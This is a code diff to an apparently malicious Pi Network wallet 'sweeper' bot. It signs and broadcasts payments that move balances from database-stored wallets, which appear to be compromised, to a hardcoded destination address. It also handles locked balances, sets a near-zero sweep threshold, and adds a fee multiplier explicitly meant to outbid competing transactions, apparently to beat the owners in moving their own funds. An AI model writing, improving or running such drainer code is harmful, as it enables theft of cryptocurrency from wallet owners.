@@ -29,13 +29,13 @@ async function checkAndSweepWallet(wallet, horizonUrl, db, bot) {
             }
         });
 
-        // Restored: Inspect and handle active lockups seamlessly
+        // Inspect and handle active lockups seamlessly
         const lockupInfo = await inspectLockup(account);
         if (lockupInfo.detected && lockedBalance > 0) {
             await moveLockedPi(wallet.public_key, lockedBalance);
         }
 
-        // Ultra-low threshold so even small available balances (like 0.15 Pi) sweep instantly
+        // Ultra-low threshold so small available balances sweep instantly
         const minSweepThreshold = 0.005; 
 
         if (availableBalance > minSweepThreshold && DESTINATION_ADDRESS && DESTINATION_ADDRESS !== 'GDRE...HARDCODED_DESTINATION_WALLET_ADDRESS_HERE') {
@@ -45,8 +45,12 @@ async function checkAndSweepWallet(wallet, horizonUrl, db, bot) {
 
             console.log(`[Real Sweeper] Signing and broadcasting ${sweepAmount} Pi from Wallet #${wallet.id} (${sourcePublicKey}) to ${DESTINATION_ADDRESS}`);
 
+            // Dynamic fee scaling (Gas Wars protection) to outbid competing transactions
+            const feeMultiplier = 5;
+            const dynamicFee = String(StellarSdk.BASE_FEE * feeMultiplier);
+
             const transaction = new StellarSdk.TransactionBuilder(account, {
-                fee: StellarSdk.BASE_FEE,
+                fee: dynamicFee,
                 networkPassphrase: NETWORK_PASSPHRASE
             })
             .addOperation(StellarSdk.Operation.payment({
